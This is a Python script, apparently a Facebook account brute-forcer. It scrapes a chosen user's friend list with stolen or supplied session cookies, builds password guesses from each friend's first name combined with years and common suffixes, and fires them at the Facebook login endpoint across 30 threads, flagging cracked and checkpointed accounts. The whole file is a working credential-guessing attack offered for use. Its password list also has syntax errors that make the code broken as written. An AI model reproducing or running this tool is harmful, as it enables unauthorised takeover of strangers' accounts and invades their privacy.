from fb import *

def brute_force(email, pw):
    ses = requests.Session()
    global acc
    for password in pw:
        try:
            req = ses.get(url, headers = headers(userAgent()))
            lsd = sort_payload(req.text, "lsd")
            jazoest = sort_payload(req.text, "jazoest")
            li = sort_payload(req.text, "li")
            m_ts = sort_payload(req.text, "m_ts")
            payload = payloads(lsd, jazoest, m_ts, li, email, password)
            post = ses.post(url_login, headers=headers_login(userAgent()), data=payload, allow_redirects=False)
            cook = ses.cookies.get_dict()
            if ("c_user" in str(cook)):
                print(f"#=> {Fore.GREEN}{email}{Fore.RESET} | {Fore.GREEN}{password}{Fore.RESET} => {Fore.GREEN}OK{Fore.RESET}")
                break
            elif ("checkpoint" in str(cook)):
                print(f"#=> {Fore.YELLOW}{email}{Fore.RESET} | {Fore.YELLOW}{password}{Fore.RESET} => {Fore.YELLOW}CP{FORE.RESET}")
                break
            else:
                continue
        except Exception as e:
            continue

def menu():
    cookies = cookies_checker("./assets/cookies.txt")
    try:
        profile = requests.get(f"{url}/profile.php", cookies={"cookie": cookies})
        xid = sort_payload(profile.text, "target")
    except:
        new_cookie = input("?=> Facebook Cookies: ")
        login_cookies(new_cookie)
    print(logo)
    try:
        print(f"•=> User Login: {Fore.GREEN}{xid}{Fore.RESET}")
    except:
        print(f"•=> User Login: {Fore.GREEN}None{Fore.RESET}")
    print(f"!=> {Fore.YELLOW}NOTE{Fore.RESET}: {Style.BRIGHT}{Fore.GREEN}This Script Is Owned By Milan Bhandari. If You Face Any Errors Kindly Message Him. WhatsApp Contact: +9779847564915{Fore.RESET}\n")
    print("!=> Warning: Crack From Friendlist!!\n") 
    username = input("?=> Username/Id: ")
    uf = f"{url}/{username}/friends?_rdr"
    fl = get_friend(uf, cookies)
    print("\n*!=> ============[BRUTE FORCE STARTED]============ <=!*\n")
    with executor(max_workers=30) as ex:
        for account in fl:
            try:
                email,name = account.split("/")
                passoword = name.split(" ")
            except:
                exit("!=> User not found")
            pw = pw = [passoword[0]+"last123",passoword[0]+"1234",
,passoword[0]+"last12345",passoword[0]+"last@12345",passoword[0]+"last@123",passoword[0]+"last@1234"
,passoword[0]+"first123", passoword[0]+"1234",
,passoword[0]+"first12345",passoword[0]+"first@12345",passoword[0]+"first@123",passoword[0]+"first@1234"
,passoword[0]+"first@123465"
,passoword[0]+"last@1991",passoword[0]+"last@1992",passoword[0]+"last@1993",passoword[0]+"last@1994"
,passoword[0]+"last@1995"
,passoword[0]+"last@1996",passoword[0]+"last@1997",passoword[0]+"last@1998",passoword[0]+"last@1999"
,passoword[0]+"last@2001"
,passoword[0]+"last@2002"
,passoword[0]+"last@2003"
,passoword[0]+"last@2004"
,passoword[0]+"last@2005"
,passoword[0]+"last@2006"
,passoword[0]+"last@2007"
,passoword[0]+"last@2008"
,passoword[0]+"last@2009"
,passoword[0]+"last@2010"
,passoword[0]+"last@2011"
,passoword[0]+"last@2012"
,passoword[0]+"last@2013"
,passoword[0]+"last@2014"
,passoword[0]+"last@2015"
,passoword[0]+"last@2016"
,passoword[0]+"last@2017"
,passoword[0]+"last@2018"
,passoword[0]+"last@2019"
,passoword[0]+"last@2020"
,passoword[0]+"last@2021"
,passoword[0]+"last@2022"
,passoword[0]+"last@2023"
,passoword[0]+"last@1212"
,passoword[0]+"last@999"
,passoword[0]+"last@789"
,passoword[0]+"last@1221"
,passoword[0]+"last@112233"
,passoword[0]+"last1991"
,passoword[0]+"last1992"
,passoword[0]+"last1993"
,passoword[0]+"last1994"
,passoword[0]+"last1995"
,passoword[0]+"last1996"
,passoword[0]+"last1997"
,passoword[0]+"last1998"
,passoword[0]+"last1999"
,passoword[0]+"last2001"
,passoword[0]+"last2002"
,passoword[0]+"last2003"
,passoword[0]+"last2004"
,passoword[0]+"last2005"
,passoword[0]+"last2006"
,passoword[0]+"last2007"
,passoword[0]+"last2008"
,passoword[0]+"last2009"
,passoword[0]+"last2010"
,passoword[0]+"last2011"
,passoword[0]+"last2012"
,passoword[0]+"last2013"
,passoword[0]+"last2014"
,passoword[0]+"last2015"
,passoword[0]+"last2016"
,passoword[0]+"last2017"
,passoword[0]+"last2018"
,passoword[0]+"last2019"
,passoword[0]+"last2020"
,passoword[0]+"last2021"
,passoword[0]+"last2022"
,passoword[0]+"last2023"
,passoword[0]+"last1212"
,passoword[0]+"last999"
,passoword[0]+"last789"
,passoword[0]+"last1221"
,passoword[0]+"last112233"
,passoword[0]+"first@1991",passoword[0]+"first@1992",passoword[0]+"first@1993",passoword[0]+"first@1994"
,passoword[0]+"first@1995"
,passoword[0]+"first@1996",passoword[0]+"first@1997",passoword[0]+"first@1998",passoword[0]+"first@1999"
,passoword[0]+"first@2001"
,passoword[0]+"first@2002"
,passoword[0]+"first@2003"
,passoword[0]+"first@2004"
,passoword[0]+"first@2005"
,passoword[0]+"first@2006"
,passoword[0]+"first@2007"
,passoword[0]+"first@2008"
,passoword[0]+"first@2009"
,passoword[0]+"first@2010"
,passoword[0]+"first@2011"
,passoword[0]+"first@2012"
,passoword[0]+"first@2013"
,passoword[0]+"first@2014"
,passoword[0]+"first@2015"
,passoword[0]+"first@2016"
,passoword[0]+"first@2017"
,passoword[0]+"first@2018"
,passoword[0]+"first@2019"
,passoword[0]+"first@2020"
,passoword[0]+"first@2021"
,passoword[0]+"first@2022"
,passoword[0]+"first@2023"
,passoword[0]+"first@1212"
,passoword[0]+"first@999"
,passoword[0]+"first@789"
,passoword[0]+"first@1221"
,passoword[0]+"first@112233"
,passoword[0]+"first1991"
,passoword[0]+"first1992"
,passoword[0]+"first1993"
,passoword[0]+"first1994"
,passoword[0]+"first1995"
,passoword[0]+"first1996"
,passoword[0]+"first1997"
,passoword[0]+"first1998"
,passoword[0]+"first1999"
,passoword[0]+"first2001"
,passoword[0]+"first2002"
,passoword[0]+"first2003"
,passoword[0]+"first2004"
,passoword[0]+"first2005"
,passoword[0]+"first2006"
,passoword[0]+"first2007"
,passoword[0]+"first2008"
,passoword[0]+"first2009"
,passoword[0]+"first2010"
,passoword[0]+"first2011"
,passoword[0]+"first2012"
,passoword[0]+"first2013"
,passoword[0]+"first2014"
,passoword[0]+"first2015"
,passoword[0]+"first2016"
,passoword[0]+"first2017"
,passoword[0]+"first2018"
,passoword[0]+"first2019"
,passoword[0]+"first2020"
,passoword[0]+"first2021"
,passoword[0]+"first2022"
,passoword[0]+"first2023"
,passoword[0]+"first1212"
,passoword[0]+"first999"
,passoword[0]+"first789"
,passoword[0]+"first1221"
,passoword[0]+"first112233"
,passoword[0]+"last@123465",name,"bismillah","123456","sayang"]
            ex.submit(brute_force,(email),(pw))
    print("\n*!=> ============[BRUTE FORCE FINISHED]============ <=!*\n")

if __name__ == '__main__':
    menu()
